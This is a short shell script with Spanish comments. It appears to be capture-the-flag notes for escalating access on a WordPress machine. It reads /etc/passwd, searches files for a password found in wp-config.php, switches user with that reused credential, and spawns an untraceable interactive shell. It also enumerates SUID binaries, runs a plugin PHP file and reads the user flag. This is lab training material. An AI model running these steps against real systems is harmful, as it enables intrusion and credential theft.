#!/bin/sh

# sacar usuarios del sistema
cat /etc/passwd

#revisar los archivos buscando la cadena ddlr$123
find / -type f \( -name "*.php" -o -name "*.txt" \) -print0 | xargs -0 grep -HnF 'ddlr{' 2>/dev/null 
#/var/www/html/wp-config.php:29:define( 'DB_PASSWORD', 'ddlr$123' );

su mati # con el password ddlr$123

printf "\e[31m"
echo "Quieres ejecutar el decorado? (y/N)"
printf "\e[0m"
read -r -n 1 -s respuesta
# Convierte la respuesta a minúsculas
respuesta_minuscula=$(echo "$respuesta" | tr '[:upper:]' '[:lower:]')
if [[ "$respuesta_minuscula" == "y" ]]; then
    # decoraciones
    script /dev/null -c bash # iniciar una shell sin dejar rastro
    export TERM=xterm
    export SHELL=bash
    #si suspendes la terminal
    # stty raw -echo; fg
fi
# buscar comandos ejecutables
find / -perm -4000 -type f 2>/dev/null

cd /var/www/html/wp-content/plugins/P3rf0rm4nc3_Bo0st3r_Plus    
php P3rf0rm4nc3_Bo0st3r_Plus.php

#vamos al home de mati
cd /home/mati
ls -la

#flag
cat user.txt
